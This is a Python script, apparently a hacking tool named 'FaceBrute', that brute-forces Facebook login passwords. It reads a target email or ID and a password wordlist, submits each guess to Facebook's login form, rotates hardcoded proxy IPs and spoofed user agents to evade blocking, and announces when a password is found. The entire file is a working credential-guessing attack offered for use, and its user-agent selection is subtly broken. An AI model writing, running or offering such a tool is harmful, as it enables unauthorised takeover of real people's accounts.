# import Libs
import mechanize # For Browser
import time # For Time
import random # For Random Choice
import sys # For System Control
import os # OS
from V7xStyle import * # For Colors And Animation
os.system("clear")
A = Animation
Black='\033[0;30m' # Black
Red='\033[0;31m' # Red
Green="\033[0;32m" # Green
Yellow="\033[0;33m" # Yellow
Blue="\033[0;34m" # Blue
Purple="\033[0;35m" # Purple
Cyan="\033[0;36m" # Cyan
White="\033[0;37m" # White
banner =''' 
\033[0;31m___________                        __________                  __           
\033[0;37m\_   _____/_____     ____    ____  \______   \_______  __ __ _/  |_   ____  
\033[0;31m |    __)  \__  \  _/ ___\ _/ __ \  |    |  _/\_  __ \|  |  \\\   __\_/ __ \ 
\033[0;37m |     \    / __ \_\  \___ \  ___/  |    |   \ |  | \/|  |  / |  |  \  ___/ 
\033[0;31m \___  /   (____  / \___  > \___  > |______  / |__|   |____/  |__|   \___  >
\033[0;37m     \/         \/      \/      \/         \/                            \/ \033[0;31mBy-SyrienHawk
'''
A.SlowLine(banner, t=0.1)
headers = [
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.00',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.01',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.02',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.52',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.53',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.54',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.24',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.26'''
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; es-la) Opera 9.27',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; fr) Opera 8.54',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; IT) Opera 8.0',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; pl) Opera 8.52',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; pl) Opera 8.54',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.0',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.01',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.53',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0',
'Mozilla/5.0 (Macintosh; I; PPC Mac OS X Mach-O; en-US; rv:1.9a1) Gecko/20061204 Firefox/3.0a1',
'Mozilla/5.0 (Macintosh; PPC Mac OS X; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0',
'Mozilla/5.0 (Macintosh; PPC Mac OS X; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.10) Gecko/2009122115 Firefox/3.0.17',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20090204 Firefox/3.1b3pre',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b4) Gecko/20090423 Firefox/3.5b4 GTB5',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; it; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; it; rv:1.9b4) Gecko/2008030317 Firefox/3.0b4',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; ko; rv:1.9.1b2) Gecko/20081201 Firefox/3.1b2',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; pl; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 FBSMTWB',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; de; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 GTB5',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6;en-US; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2) Gecko/20091218 Firefox 3.6b5',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; he; rv:1.9.1b4pre) Gecko/20100405 Firefox/3.6.3plugin1',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.7; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X; de-AT; rv:1.9.1.8) Gecko/20100625 Firefox/3.6.6',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.12pre) Gecko/20080122 Firefox/2.0.0.12pre',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.13) Gecko/20080313 Firefox',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en-GB; rv:1.9.2.19) Gecko/20110707 Firefox/3.6.19',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en-GB; rv:1.9b5) Gecko/2008032619 Firefox/3.0b5',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en-US; rv:1.9.0.4) Gecko/20081029 Firefox/2.0.0.18',
'Mozilla/5.0 Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.13) Firefox/3.6.13',
'Mozilla/5.0 (U; Windows NT 5.1; en-GB; rv:1.8.1.17) Gecko/20080808 Firefox/2.0.0.17',
'Mozilla/5.0 (Windows 98; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0',
'Mozilla/5.0 (Windows NT 5.0; rv:21.0) Gecko/20100101 Firefox/21.0'
]


def main():
    try:
        try:
            username = input('\033[0;31mEmail |\033[0;37m| Username |\033[0;31m| ID: ') # UserName
            password = input('\033[0;31mPassword File |\033[0;37m| WordList: ') # Password
            try:
                file = open(password, "r")  # Open WordList + Read
            except FileNotFoundError:  # If The File Not Found
                os.system("clear")
                A.SlowLine(banner, t=0.1)
                print("\033[0;31m[✖] File Not Found")
                print("")
                return main()
            cou = 0 # Count Lines In File
            for line in file: # For Loop For Count
                line = line.strip('\n')
                cou += 1
            if (len(username) == 0 ): # IF No Inputs In Username
                os.system("clear")
                A.SlowLine(banner, t=0.1)
                print ("\033[0;31m[✖] Please Enter UserName")
                print ("")
                return main()
            elif (len(password) == 0): # IF No Inputs In Password
                os.system("clear")
                A.SlowLine(banner, t=0.1)
                print("\033[0;31m[✖] Please Enter WordList")
                print("")
                return main()
            # If UserName Is True And Password Is True
            else:
                print("")
                A.SlowText(
                    "\033[0;31m#=-=-=-=-=-=-=\033[0;37m-=-=-=-=-=-=\033[0;31m-=-=-=-=-=-=-#")  # SlowText Animation
                print("\nTotal Passwords in WordList: " + format(cou))
                print("")
                print("")
        except KeyboardInterrupt:
            A.DL(t=0.1)
            print("\n\033[0;32m[✔] Exit")
            sys.exit(1)
        # Brute Mode
        def brute():
            try:
                try:
                    try:
                        br = mechanize.Browser() # Browser
                        try:
                            file = open(password, "r")
                        except FileNotFoundError:
                            os.system("clear")
                            A.SlowLine(banner, t=0.1)
                            print ("\033[0;31m[✖] File Not Found")
                            print ("")
                            return main()
                    except NameError:
                        sys.exit(1)
                    for passwords in file: # For Lops For Passwords
                        proxy = [
                            '24.73.150.242:3128',
                            '34.105.59.26:80',
                            '104.45.188.43:3128',
                            '95.174.67.50:18080',
                            '82.200.233.4:3128',
                            '24.73.150.242:3128',
                            '34.105.59.26:80',
                            '104.45.188.43:3128',
                            '182.72.150.242:8080',
                            '31.28.99.25:31396',
                            '88.99.10.251:1080',
                            '144.76.214.154:1080',
                            '88.99.10.248:1080',
                            '144.76.214.155:1080',
                            '213.23.90.155:8080',
                            '54.38.218.212:6582',
                            '188.40.183.191:1080',
                            '103.216.51.210:8191',
                            '188.40.183.190:1080',
                            '192.140.91.133:50701',
                            '69.195.157.162:8100',
                            '188.40.183.187:1080',
                            '144.76.214.157:1080',
                                ]
                        rand_proxy = random.choice(proxy) # Choise Random Proxy
                        url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
                        try:
                            try:
                                try:
                                    br.set_proxies({'http': rand_proxy})
                                    cookies = mechanize.CookieJar()
                                    br.set_cookiejar(cookies)
                                    br.set_handle_robots(False)
                                    br.set_handle_redirect(True) # Redirect Link
                                    br.set_handle_equiv(True)
                                    br.set_handle_referer(True)
                                    br.set_handle_refresh(True)
                                    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
                                    for header in headers:
                                        choice=random.choice(header)
                                        br.addheaders = [('User-agent',choice)] # Random Agents
                                    br.open(url)
                                except:
                                    continue        # For Any Error continue
                                try:
                                    br.select_form(nr=0)
                                except:
                                    continue
                                br.form['email'] = username
                                br.form['pass'] = passwords
                                sub = br.submit()
                                urlget = sub.geturl()
                                if urlget != url and (not 'login_attempt' in urlget): # IF Found Password
                                    print ("\033[0;32m[✔] Password Found >> "+"\033[0;37m"+passwords)
                                    sys.exit(1)
                                else:
                                    print ("\033[0;31m[✖] Attack IP: "+'\033[0;37m'+ rand_proxy + " || "+"\033[0;31mAttack Password: "+'\033[0;37m'+passwords)
                            except mechanize._urllib2.URLError:
                                print ("\033[0;31m[✖] No Connection Wait 1m")
                                A.DL(t=60)
                                continue
                        except ConnectionAbortedError:
                            continue

                except KeyboardInterrupt:
                        print ("\n\033[0;31m[✖] Exit")
                        sys.exit(1)
            except ConnectionError:
                print ("\033[0;31m[✖] No Connection")
                sys.exit(1)
    except TimeoutError:
        print ("\033[0;31m[✖] TimeOutError")
        sys.exit(1)
    brute()
if __name__ == '__main__':
        main()
